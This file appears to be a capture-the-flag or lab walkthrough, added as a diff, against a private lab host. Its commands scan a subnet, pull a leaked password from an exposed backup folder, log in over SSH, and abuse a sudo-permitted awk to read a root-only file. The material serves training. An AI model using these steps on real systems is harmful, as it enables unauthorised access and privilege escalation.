@@ -1,0 +1,15 @@
+## find the web server and read its pages
+nmap -sn 10.10.2.0/24
+nmap -sV 10.10.2.30
+curl -s http://10.10.2.30/
+curl -s http://10.10.2.30/robots.txt
+## the hidden folder has a note with the password
+curl -s http://10.10.2.30/site-backup/deploy-notes.txt
+## sign in and take the user flag
+ssh -o StrictHostKeyChecking=accept-new deploy@10.10.2.30
+{{PW1}}
+cat flag.txt
+sudo -l
+## awk runs as root and can print any file
+sudo awk '{ print }' /root/flag.txt
+exit
